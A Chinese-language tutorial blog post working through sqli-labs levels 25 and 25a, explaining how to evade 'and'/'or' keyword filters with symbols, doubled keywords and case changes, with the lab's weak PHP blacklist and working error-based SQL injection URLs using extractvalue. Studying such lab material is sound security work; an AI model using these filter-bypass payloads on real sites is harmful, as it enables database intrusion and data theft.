---
title: 绕过and与or过滤
toc: true
description: 本文通过 sqli-lab 25及25a来学如何应对 and 与 or 的过滤。
summary: 本文通过 sqli-lab 25及25a来学如何应对 and 与 or 的过滤。
categories:
    - websec
    - sql injection
date: 2019-08-04 09:02:03
tags:
---

# 绕过方式

以下绕过方式基本按照实用程度（好用程度）排序

## or 绕过方式

### 符号绕过：||

注意：|| 直接使用就行，它不属于 url 中需要被转移的那种。

符号可以绕过的原因是 waf 一般只检测 and 和 or 的单词关键字，不检测对应数学符号。当然，要是 waf 过滤了它们，这种绕过也就不管用了，比如：本关可以在 blacklist 中加入以下代码，便过滤了& 和 |

    $id= preg_replace('/\\|/',"", $id);
    $id= preg_replace('/\\&/',"", $id);

### 双字符绕过：oorr

一次过滤，检测到中间的 or，去掉它，然后还剩下 o 和 r，正好组成一个 or，所以可以绕过。双字符应用了开发人员只进行一次过滤而不循环过滤的过失，当然，如果开发人员进行循环过滤，那么这种绕过方式就不管用了。

比如：本关的源码，就只是用一次过滤。

```php
$id= blacklist($id);
//中间省略好多行
function blacklist($id)
{
	$id= preg_replace('/or/i',"", $id);			//strip out OR (non case sensitive)
	$id= preg_replace('/AND/i',"", $id);		//Strip out AND (non case sensitive)

return $id;
}
```

### 大小写变形：Or,Or,or

一般用来绕过那些只检测 and 和 or，而不检测别的大小写形式（即：使用正则时，没有用 i 选项，忽略大小写进行匹配），当然，如果开发者使用正则时加了 i 选项，那这种绕过方式就失效了。这种方法不太管用（因为好多 waf 都不缺分大小写。）

## and 绕过方式

### 双字符：anandd

### 符号绕过:&&

注意：&& 不能直接使用，需要对他进行 url 编码，因为 &在 url 中有特殊用法：连接 get 请求的键值对。所以，就像 # 一样，在 url 中 # 号是用来指导浏览器动作的（例如锚点），所以使用它的时候也要进行 url 编码

### 大小写 aNd,AND,等

# 关键步骤

## 检测注入点

加个单引号，回显如下：

> **Warning**: mysql_fetch_array() expects parameter 1 to be resource, boolean given in **C:\phpStudy\WWW\sqli-labs\Less-25\index.php** on line **39**
> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1

嗯，有语句报错，真好。根据 '1'' LIMIT 0,1，我们得知，单引号包裹，后面有语句。

尝试加个注释，嗯，加了之后，不报错了，证明没有过滤注释。

## 猜字段

?id=1' order by 3--+

报错：

> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'der by 3-- ' LIMIT 0,1' at line 1

可以看出 or 被过滤了（or 和 and 往往一起，开发人员想到过滤其一，就会想到另一个。因此，我们有理由相信 and 也被过滤了。）。

这里采用双字符，因为过滤 or，却影响到了 order by 中的 or，这是不怎么好的过滤（我认为），当然，还有其他一些类似的情况，比如：information 中的 or

?id=1' oorrder by 2 --+
不报错，显示正常，绕过成功。

后面使用 union 查询注入就行了。

# 报错注入

下面使用报错注入对 and/or 过滤注入进行进一步讲解。

双字符绕过：

?id=-1' oorr extractvalue(1,concat(0x23,(select schema_name from infoorrmation_schema.schemata limit 0,1))) --+

这里注意：information 中的 or 也要双字符。

?id=-1' anandd extractvalue(1,concat(0x23,concat(version())))--+

符号绕过：

?id=-1' || extractvalue(1,concat(0x23,concat(version())))--+

?id=-1' %26%26 extractvalue(1,concat(0x23,concat(version())))--+

注意：&&要使用 url 编码
